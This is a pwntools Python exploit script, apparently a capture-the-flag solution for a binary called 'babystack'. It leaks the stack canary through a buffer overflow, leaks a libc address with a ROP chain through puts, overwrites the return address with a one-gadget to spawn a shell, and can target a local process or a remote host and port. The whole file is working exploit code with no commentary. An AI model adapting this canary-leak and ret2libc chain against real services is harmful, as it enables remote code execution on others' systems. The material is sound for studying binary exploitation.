#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os="linux", arch="amd64", log_level="info")
localfile = "babystack"
libc = "libc-2.23.so"

def menu(idx):
    io.recvuntil(">> ")
    io.sendline(str(idx))

def store(p):
    menu(1)
    io.send(p)

def exp():
    # leak canary
    payload = b"A"*0x88 + b"B"
    store(payload)
    menu(2)
    io.recvuntil("B")
    canary = u64(io.recv(7).rjust(8, b"\x00"))
    log.debug("canary: 0x%x" % canary)

    # leak libc
    payload = b"A"*0x88 + p64(canary) + p64(0xdeadbeef) + p64(0x400a93) + p64(elf.got["puts"]) + \
        p64(elf.plt["puts"]) + p64(0x400908)
    store(payload)
    menu(3)
    puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
    libc = LibcSearcher("puts", puts_addr)
    libc_base = puts_addr - libc.dump("puts")

    # onegadget 0x45216
    onegadget_addr = libc_base + 0x45216
    payload = b"A"*0x88 + p64(canary) + p64(0xdeadbeef) + p64(onegadget_addr)
    store(payload)
    menu(3)

    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(libc)
exp()
